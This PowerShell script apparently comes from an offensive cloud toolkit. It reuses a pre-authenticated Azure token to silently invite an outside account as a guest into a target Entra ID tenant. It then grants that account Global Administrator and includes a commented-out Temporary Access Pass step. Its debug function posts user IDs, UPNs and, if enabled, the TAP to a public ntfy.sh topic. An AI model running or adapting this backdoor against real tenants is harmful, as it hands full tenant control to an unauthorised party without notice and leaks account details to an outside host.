<#
   Title: Invite Subscription User as Guest with TAP and Global Administrator Role
   Description: Invites a subscription user as a guest to the target Entra ID tenant, assigns Global Administrator permissions, and creates a TAP for authentication, using pre-authenticated Azure session.
   Target: Cloud Subscription - PowerShell - 7.4.0 | Microsoft.Graph - 2.26.0
   Version: 2025.04.07
   <Uses MgGraph Commands>
#>

param (
    [Parameter(Mandatory = $true)]
    [string]$SubscriptionTenant,      # Tenant ID of Tenant A (original tenant)
    [Parameter(Mandatory = $true)]
    [string]$SubscriptionUser,        # Email of the user in Tenant A (e.g., user@tenantA.onmicrosoft.com)
    [Parameter(Mandatory = $true)]
    [string]$TenantName,              # Tenant ID of Tenant B (target tenant)
    [switch]$ScriptDebug              # Enable debug output
)

function Send-DebugMessage {
    param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [string]$Message,
        [string]$DebugUrl = "https://ntfy.sh/PSO78HOMAXEXKSaQ"
    )

    if ($global:DebugUrl) {
        $DebugUrl = $global:DebugUrl
    }
    
    if ($DebugUrl -and $ScriptDebug) {
        try {
            Invoke-WebRequest -Uri $DebugUrl -Method Post -Body $Message -ErrorAction Stop | Out-Null
        } catch {
            Write-Warning "Failed to send debug message: $_"
        }
    }
    if ($ScriptDebug) {
        Write-Output $Message
    }
}

# Ensure Microsoft.Graph module is loaded
if (-not (Get-Module -Name Microsoft.Graph -ListAvailable)) {
    Send-DebugMessage "Microsoft.Graph module not found. Please install it using 'Install-Module -Name Microsoft.Graph'."
    exit 1
}

try {
    # Connect to Tenant B (assumes pre-authenticated session or credentials available)
    Send-DebugMessage "Connecting to Microsoft Graph for tenant: $TenantName"
    $AccessToken = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com" -TenantId $TenantName).Token
    $SecureToken = ConvertTo-SecureString $AccessToken -AsPlainText -Force
    Connect-MgGraph -AccessToken $SecureToken -NoWelcome

    # Invite the user from Tenant A as a guest to Tenant B
    Send-DebugMessage "Inviting user $SubscriptionUser as a guest to tenant $TenantName"
    $guestUserParams = @{
        invitedUserEmailAddress = $SubscriptionUser
        inviteRedirectUrl       = "https://myapps.microsoft.com"  # Optional redirect after sign-in
        sendInvitationMessage   = $false                          # No email sent for silent operation
    }
    $invitation = New-MgInvitation -BodyParameter $guestUserParams -ErrorAction Stop
    $userId = $invitation.InvitedUser.Id
    Send-DebugMessage "Guest user created with ID: $userId"

    # Assign Global Administrator role
    Send-DebugMessage "Assigning Global Administrator role to user $SubscriptionUser"
    $roleDefinition = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'" -ErrorAction Stop
    if (-not $roleDefinition) {
        # If role isn't activated, activate it by scoping it
        $roleTemplate = Get-MgDirectoryRoleTemplate -Filter "displayName eq 'Global Administrator'" -ErrorAction Stop
        New-MgDirectoryRole -RoleTemplateId $roleTemplate.Id -ErrorAction Stop
        $roleDefinition = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'" -ErrorAction Stop
    }
    $roleId = $roleDefinition.Id
    New-MgDirectoryRoleMember -DirectoryRoleId $roleId -DirectoryObjectId $userId -ErrorAction Stop
    Send-DebugMessage "Global Administrator role assigned successfully"

    # Optional: Create a Temporary Access Pass (TAP) - Uncomment if needed
    # Note: TAP is typically for native users, not B2B guests, unless resetting auth methods
    <#
    Send-DebugMessage "Creating Temporary Access Pass for user $SubscriptionUser"
    $tapParams = @{
        isUsableOnce = $true
        lifetimeInMinutes = 60
    }
    $tap = New-MgUserAuthenticationTemporaryAccessPassMethod -UserId $userId -BodyParameter $tapParams -ErrorAction Stop
    Send-DebugMessage "TAP created: $($tap.TemporaryAccessPass)"
    #>

    # Verify the user
    $user = Get-MgUser -UserId $userId -ErrorAction Stop
    Send-DebugMessage "User created: UPN = $($user.UserPrincipalName), UserType = $($user.UserType)"

} catch {
    Send-DebugMessage "Error occurred: $_"
    throw
} finally {
    # Disconnect from Graph (optional, depending on your session management)
    Disconnect-MgGraph -ErrorAction SilentlyContinue
    Send-DebugMessage "Script execution completed"
}
